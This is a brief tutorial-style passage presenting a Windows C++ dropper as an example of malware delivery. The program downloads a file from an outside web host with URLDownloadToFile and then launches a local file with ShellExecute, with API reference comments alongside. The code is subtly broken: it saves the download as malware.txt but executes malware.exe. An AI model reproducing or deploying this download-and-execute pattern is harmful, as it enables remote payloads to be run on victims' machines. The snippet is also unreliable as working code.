We’ll provide some simple examples of malware delivery techniques. Note that these are simplified
examples and concepts; real-world malware often employs more sophisticated strategies and evasion
techniques

## Download and execute malware from a remote server:

A malware might be hosted on a remote server and a dropper program can be used to download and execute it:



```cpp
#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    URLDownloadToFile(NULL, "https://auto-download-one.vercel.app/myfile.txt", "malware.txt", 0, NULL);

    // HRESULT URLDownloadToFile(
    //              LPUNKNOWN            pCaller,    Used if you want COM object identity (rare in normal code).
    //              LPCTSTR              szURL,      The URL of the file you want to download.
    //              LPCTSTR              szFileName, The full local path where you want the file saved. Must include both the path and filename.
    //   _Reserved_ DWORD                dwReserved,  Reserved. Always 0.
    //              LPBINDSTATUSCALLBACK lpfnCB       Optional callback function to track download progress. NULL if you don’t care about progress.
    // );

    ShellExecute(NULL, "open", "malware.exe", NULL, NULL, SW_SHOWNORMAL);

    //     HINSTANCE ShellExecuteA(
    //     HWND   hwnd,         // handle to parent window (can be NULL)
    //     LPCSTR lpOperation,  // action to perform: "open", "edit", "print", etc.
    //     LPCSTR lpFile,       // file name or program to execute
    //     LPCSTR lpParameters, // arguments if lpFile is an executable
    //     LPCSTR lpDirectory,  // default working directory (NULL = current)
    //     INT    nShowCmd      // how the window is shown (SW_SHOWNORMAL, hidden, etc.)
    // );

    return 0;
}
```